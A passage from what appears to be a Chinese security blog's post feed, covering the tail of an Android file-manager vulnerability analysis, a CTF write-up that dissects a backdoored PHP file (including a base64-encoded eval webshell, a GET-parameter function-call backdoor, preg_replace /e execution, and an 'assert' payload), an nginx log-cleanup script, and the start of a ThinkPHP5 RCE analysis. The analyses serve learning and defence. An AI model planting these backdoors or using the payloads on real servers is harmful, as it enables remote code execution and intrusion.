class="keyword">if</span> (!((Iterator)localObject1).hasNext()) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        localPackageInfo = (PackageInfo)((Iterator)localObject1).next();</span><br><span class="line">        localObject3 = localPackageInfo.applicationInfo;</span><br><span class="line">        <span class="keyword">if</span> (paramInt == <span class="number">0</span>)<span class="comment">//传入a的等于0</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x80</span>) == <span class="number">0</span>) &amp;&amp; ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x1</span>) != <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (paramInt != <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">break</span> label146;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception localException)</span><br><span class="line">      &#123;</span><br><span class="line">        localException.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;500 Internal Server Error&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, localException.toString());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        label146:</span><br><span class="line">        <span class="keyword">if</span> (paramInt == <span class="number">2</span>)<span class="comment">//传入a的值等于2</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x40000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (paramInt == <span class="number">3</span>)<span class="comment">//传入a的值等于3</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x40000</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (paramInt == <span class="number">4</span>) &#123;<span class="comment">//传入a的等于4</span></span><br><span class="line">          ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      String str;</span><br><span class="line">      <span class="keyword">if</span> (paramInt &lt; ((LinkedList)localObject2).size())</span><br><span class="line">      &#123;</span><br><span class="line">        localPackageInfo = (PackageInfo)((LinkedList)localObject2).get(paramInt);</span><br><span class="line">        localObject3 = <span class="keyword">new</span> <span class="title class_">File</span>(localPackageInfo.applicationInfo.sourceDir);</span><br><span class="line">        <span class="keyword">if</span> (!((File)localObject3).exists()) &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">long</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0L</span>;; l = ((File)localObject3).length())</span><br><span class="line">        &#123;</span><br><span class="line">                                <span class="comment">//回显JSON的字符串进行拼接</span></span><br><span class="line">          str = localException + <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;packageName\&quot;:\&quot;&quot;</span> + localPackageInfo.packageName + <span class="string">&quot;\&quot;, &quot;</span>;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;label\&quot;:\&quot;&quot;</span> + com.estrongs.android.pop.utils.c.a(FexApplication.a().getPackageManager(), localPackageInfo.applicationInfo) + <span class="string">&quot;\&quot;, &quot;</span>;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;version\&quot;:\&quot;&quot;</span> + localPackageInfo.versionName + <span class="string">&quot;\&quot;, &quot;</span>;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;versionCode\&quot;:\&quot;&quot;</span> + localPackageInfo.versionCode + <span class="string">&quot;\&quot;, &quot;</span>;</span><br><span class="line">          localObject3 = localPackageInfo.applicationInfo.sourceDir;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;location\&quot;:\&quot;&quot;</span> + (String)localObject3 + <span class="string">&quot;\&quot;, &quot;</span>;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;size\&quot;:\&quot;&quot;</span> + l + <span class="string">&quot;\&quot;, &quot;</span>;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;status\&quot;:\&quot;&quot;</span> + localPackageInfo.applicationInfo.backupAgentName + <span class="string">&quot;\&quot;, &quot;</span>;</span><br><span class="line">          str = str + <span class="string">&quot;\&quot;mTime\&quot;:\&quot;&quot;</span> + localPackageInfo.lastUpdateTime + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">if</span> (paramInt &gt;= ((LinkedList)localObject2).size() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          str = str + <span class="string">&quot;&#125;,\r\n&quot;</span>;</span><br><span class="line">          <span class="keyword">break</span> label760;</span><br><span class="line">        &#125;</span><br><span class="line">        str = str + <span class="string">&quot;&#125;\r\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str = str + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        localObject2 = <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;200 OK&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, a(str));</span><br><span class="line">        ((c.b)localObject2).a(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + str.getBytes(<span class="string">&quot;utf-8&quot;</span>).length);</span><br><span class="line">        <span class="keyword">return</span> localObject2;</span><br><span class="line">        str = <span class="string">&quot;[\r\n&quot;</span>;</span><br><span class="line">        paramInt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      label760:</span><br><span class="line">      paramInt += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>漏洞主要成因是官方没有对文件分享功能的传入功能的传入者进行身份合法性验证，导致可以被任意执行命令，第一次做APP分析，不足之处请多多指出</p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeReview </tag>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个CTF题</title>
      <link href="/p/2364522992.html"/>
      <url>/p/2364522992.html</url>
      
        <content type="html"><![CDATA[<p>前些日子一打CTF的朋友发了个PHP文件给我，让我帮着看看</p><span id="more"></span><p>evil.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">下面是被黑客修改过的文件，请下载并将其中可能存在问题的地方进行修复，上传修复后的结果，若修复正确，你将得到Flag。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;php_info&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;exitmeeting&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;您已成功退出群!&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>    = <span class="keyword">array</span>(<span class="string">&quot;touser&quot;</span> =&gt; <span class="string">&quot;<span class="subst">$openid</span>&quot;</span>, <span class="string">&quot;msgtype&quot;</span> =&gt; <span class="string">&quot;text&quot;</span>, <span class="string">&quot;text&quot;</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;content&quot;</span> =&gt; <span class="string">&quot;<span class="subst">$content</span>&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$kfarray</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$data</span>, <span class="variable">$kfarray</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$msg</span>       = <span class="variable">$weObj</span>-&gt;<span class="title function_ invoke__">sendCustomMessage</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$sql</span>       = <span class="string">&quot;select meetingid from <span class="subst">&#123;$tablepre&#125;</span>membersinfo where uid=:uid&quot;</span>;</span><br><span class="line">    <span class="variable">$meetingid</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">fetchOneBySql</span>(<span class="variable">$sql</span>, <span class="keyword">array</span>(<span class="string">&quot;:uid&quot;</span> =&gt; <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>]));</span><br><span class="line">    <span class="variable">$sql</span>       = <span class="string">&quot;UPDATE <span class="subst">&#123;$tablepre&#125;</span>membersinfo SET meetingid=&#x27;0&#x27; WHERE uid=&#x27;<span class="subst">$user</span>[uid]&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>, <span class="keyword">array</span>(<span class="string">&quot;:uid&quot;</span> =&gt; <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>]));</span><br><span class="line">    <span class="variable">$rdb</span>-&gt;<span class="title function_ invoke__">update</span>(<span class="string">&#x27;membersinfo&#x27;</span>, <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>], <span class="keyword">array</span>(<span class="string">&quot;meetingid&quot;</span> =&gt; <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$meetingid</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$sql</span>              = <span class="string">&quot;SELECT users FROM <span class="subst">&#123;$tablepre&#125;</span>meeting WHERE id=:id&quot;</span>;</span><br><span class="line">        <span class="variable">$meetinginfousers</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">fetchOneBySql</span>(<span class="variable">$sql</span>, <span class="keyword">array</span>(<span class="string">&quot;:id&quot;</span> =&gt; <span class="variable">$meetingid</span>));</span><br><span class="line">        <span class="variable">$userarray</span>        = <span class="title function_ invoke__">array_delete_value</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$meetinginfousers</span>), <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newusers</span>         = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$userarray</span>)) &#123;</span><br><span class="line">            <span class="variable">$newusers</span> = @<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$userarray</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">&#123;$tablepre&#125;</span>meeting SET users=:users WHERE id=:id&quot;</span>;</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>, <span class="keyword">array</span>(<span class="string">&quot;:users&quot;</span> =&gt; <span class="variable">$newusers</span>, <span class="string">&quot;:id&quot;</span> =&gt; <span class="variable">$meetingid</span>));</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">meetingmenu</span>(<span class="variable">$meetingid</span>, <span class="string">&#x27;exit&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$header = \&quot;&quot;</span> . <span class="variable">$tpl</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;header&quot;</span>, <span class="string">&#x27;mobile&#x27;</span>) . <span class="string">&quot;\&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$footer = \&quot;&quot;</span> . <span class="variable">$tpl</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;footer&quot;</span>, <span class="string">&#x27;mobile&#x27;</span>) . <span class="string">&quot;\&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$tpl-&gt;output(\&quot;&quot;</span> . <span class="variable">$tpl</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;mobile&#x27;</span>) . <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;cookie&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_COOKIE</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ssetcookie</span>(<span class="variable">$key</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() + <span class="number">315360000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">printarray</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;register&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;linkurl&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$openid</span> = @<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/linkurl/e&quot;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;linkurl&#x27;</span>], <span class="string">&quot;Cookie_linkurl&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$openid</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:&#x27;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&#x27;linkurl&#x27;</span>] . <span class="string">&#x27;&amp;flag=register&amp;openid=&#x27;</span> . <span class="variable">$openid</span>);<span class="keyword">exit</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:&#x27;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&#x27;linkurl&#x27;</span>] . <span class="string">&#x27;&amp;flag=register&#x27;</span>);<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/mob.php?openid=1&#x27;</span>);<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;table&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="number">1</span>, <span class="variable">$usergroup</span>)) &#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">showtables</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$info</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="comment">// echo $value.&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/qiye/&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="variable">$sql</span>  = <span class="string">&quot;SHOW FIELDS FROM <span class="subst">&#123;$tablepre&#125;</span><span class="subst">$value</span>&quot;</span>;</span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">fetchAssocArrBySql</span>(<span class="variable">$sql</span>);</span><br><span class="line">                <span class="variable">$value</span> . <span class="string">&#x27;=&gt;&#x27;</span> . <span class="title function_ invoke__">count</span>(<span class="variable">$data</span>) . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$content</span> .= <span class="string">&quot;&#x27;&quot;</span> . <span class="variable">$value</span> . <span class="string">&quot;&#x27;=&gt;&quot;</span> . <span class="title function_ invoke__">count</span>(<span class="variable">$data</span>) . <span class="string">&quot;,&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$content</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span> .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;auth&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$referer</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>    = <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;bG9zdC5waHA=&#x27;</span>), w), <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg==&#x27;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>[<span class="string">&#x27;openid&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&#x27;https://open.weixin.qq.com/connect/oauth2/authorize?appid=&#x27;</span> . <span class="variable">$weixin_appid</span> . <span class="string">&#x27;&amp;redirect_uri=http://&#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] . <span class="string">&#x27;/mobile/login.php?referer=&#x27;</span> . <span class="variable">$referer</span> . <span class="string">&#x27;&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=STATE#wechat_redirect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:<span class="subst">$url</span>&quot;</span>);<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;getopenid&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$referer</span> = <span class="variable">$referer</span> . <span class="string">&#x27;&amp;openid=&#x27;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&#x27;openid&#x27;</span>];</span><br><span class="line">    <span class="variable">$referer</span> = <span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:<span class="subst">$referer</span>&quot;</span>);<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单看了下，审计后门类型的，首先看到了文件结尾的<code>$referer = $_GET[a]($_GET[b]);</code></p><p>该处可以构造<code>?a=assert&amp;b=phpinfo</code>来实现代码执行</p><p>继续往上看发现了一串<code>base64</code>编码后的内容<code>PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg==</code>和<code>bG9zdC5waHA=</code>，两串字符串解码后是<code>&lt;?php @eval($_POST[&#39;lostwolf&#39;]);?&gt;</code>和<code>lost.php</code></p><p>至此，可以判断当URL为<code>xxx.php?action=auth</code>时会在当前目录生成内容为<code>&lt;?php @eval($_POST[&#39;lostwolf&#39;]);?&gt;</code>一句话木马<code>lost.php</code></p><p>继续往上看发现了<code>@preg_replace(&quot;/linkurl/e&quot;</code>，根据官方文档</p><blockquote><p>模式修饰符<br>下面列出了当前可用的 PCRE 修饰符。括号中提到的名字是 PCRE 内部这些修饰符的名称。 模式修饰符中的空格，换行符会被忽略，其他字符会导致错误。</p><ul><li><em>i</em> (<em>PCRE_CASELESS</em>)</li></ul><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</p><ul><li><em>m</em> (<em>PCRE_MULTILINE</em>)</li></ul><p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 <em>D</em> 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 &#x2F;m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</p><ul><li><em>s</em> (<em>PCRE_DOTALL</em>)</li></ul><p>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的&#x2F;s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。</p><ul><li><em>x</em> (<em>PCRE_EXTENDED</em>)</li></ul><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。 这个修饰符 等同于 perl 中的 &#x2F;x 修饰符，使被编译模式中可以包含注释。 注意：这仅用于数据字符。 空白字符 还是不能在模式的特殊字符序列中出现，比如序列 (?( 引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误。 比如(?(就会导致错误)。</p><ul><li><em>e</em> (<em>PREG_REPLACE_EVAL</em>)</li></ul><p><strong>Warning</strong>This feature was <em>DEPRECATED</em> in PHP 5.5.0, and <em>REMOVED</em> as of PHP 7.0.0.</p><p>如果设置了这个被弃用的修饰符， <a href="http://php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(**)和 NULL 字符在 后向引用替换时会被用反斜线转义.</p></blockquote><p><code>preg_replace()</code>修饰符为e且PHP版本低于7.0.0时会造成代码执行</p><p>找到问题后的修复就很简单了，该删的删，该改的改~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自动清理NGINX日志脚本</title>
      <link href="/p/a0c3.html"/>
      <url>/p/a0c3.html</url>
      
        <content type="html"><![CDATA[<p>再次印证了免费的就是最贵的这句话<br>网上脚本或多或少都有错 改完后能运行了</p><span id="more"></span><p>直接上脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">nginx access <span class="built_in">log</span> segmentation shell script</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">日志目录</span></span><br><span class="line">log_dir=&quot;/home/wwwlogs/&quot;</span><br><span class="line">cd $log_dir</span><br><span class="line">time=`date +%Y%m%d --date=&quot;-1 day&quot;`</span><br><span class="line">nginxDir=&quot;/usr/bin/nginx&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">日志保存天数</span></span><br><span class="line">save_days=5</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">日志文件名所处<span class="string">&#x27;/&#x27;</span>分割的位置</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">可执行</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">ls</span> 日志目录/*.<span class="built_in">log</span> | xargs -n 1 | <span class="built_in">cut</span> -f 1 -d <span class="string">&quot;.&quot;</span> | <span class="built_in">cut</span> -f 数字 -d <span class="string">&quot;/&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">进行查看 直到能正确显示日志文件名为止</span></span><br><span class="line">num=4;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">此处待优化（取得文件不带后缀的文件名）</span></span><br><span class="line">website=`ls $log_dir*.log | xargs -n 1 | cut -f 1 -d &quot;.&quot; | cut -f $num -d &quot;/&quot;`</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">日志目录下所有的日志文件为文件夹，循环新建对应的时间文件</span></span><br><span class="line">for i in $website </span><br><span class="line">do</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">判断目录是否存在</span></span><br><span class="line">if [ ! -d $log_dir$i ];</span><br><span class="line">then</span><br><span class="line">mkdir &quot;$i&quot;</span><br><span class="line">fi</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">移动原日志到新文件夹</span></span><br><span class="line">mv $log_dir$i.log $log_dir$i/$i-$time.log</span><br><span class="line"><span class="meta">true&gt;</span><span class="language-bash">$log_dir<span class="variable">$i</span>.<span class="built_in">log</span></span></span><br><span class="line">done</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">删除设置天数前的数据</span></span><br><span class="line">find $log_dir -mtime +$save_days -exec rm -rf &#123;&#125; \;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">平滑启动nginx</span></span><br><span class="line">nginxDir -s reload</span><br></pre></td></tr></table></figure><p>赋予执行权限<code>chmod +x cut_nginx_log.sh</code> </p><p>然后在<code>crontab</code>里面加个任务<br><code>0 0 * * * /bin/bash /path/to/your/cut_nginx_log.sh</code></p><p>每天0点0分执行切割日志</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5多个RCE+文件写入漏洞</title>
      <link href="/p/692b.html"/>
      <url>/p/692b.html</url>
      
        <content type="html"><![CDATA[<p>ThinkPHP漏洞 跟着大佬学习下</p><span id="more"></span><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>近日thinkphp团队发布了版本更新<a href="https://blog.thinkphp.cn/869075">https://blog.thinkphp.cn/869075</a> ，其中修复了一处getshell漏洞。</p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>5.x &lt; 5.1.31<br>&lt;&#x3D; 5.0.23</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>远程代码执行</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><strong>以下漏洞分析源于斗鱼SRC公众号:斗鱼安全应急响应中心</strong><br>分析补丁：<code>802f284bec821a608e7543d91126abc5901b2815</code><br>路由信息中<code>controller</code>的部分进行了过滤，可知问题出现在路由调度时。<br><img src="/images/cuFsz4H.png"><br>以5.1.23版本进行分析，执行路由调度的代码如下：<br><img src="/images/DM8TEz9.png"><br>其中使用了<code>$this-&gt;app-&gt;controller</code>方法来实例化控制器，然后调用实例中的方法。跟进<code>controller</code>方法：<br><img src="/images/Pf9P9Zm.png"><br>其中通过parseModuleAndClass方法解析出<code>$module</code>和<code>$class</code>，然后实例化<code>$class</code>。<br><code>rseModuleAndClass</code>方法中，当<code>$name</code>以反斜线\开始时直接将其作为类名。利用命名空间的特点，如果可以控制此处的<code>$name</code>（即路由中的controller部分），那么就可以实例化任何一个类。<br>接着，我们再往回看路由解析的代码。其中<code>route/dispatch/Url.php:: parseUrl</code>方法调用了<code>route/Rule.php:: parseUrlPath</code>来解析<code>pathinfo</code>中的路由信息<br><img src="/images/PwlJiDz.png"><br>代码比较简单，就是使用&#x2F;对<code>$url</code>进行分割，未进行任何过滤。<br>其中的路由url从<code>Request::path()</code>中获取<br><img 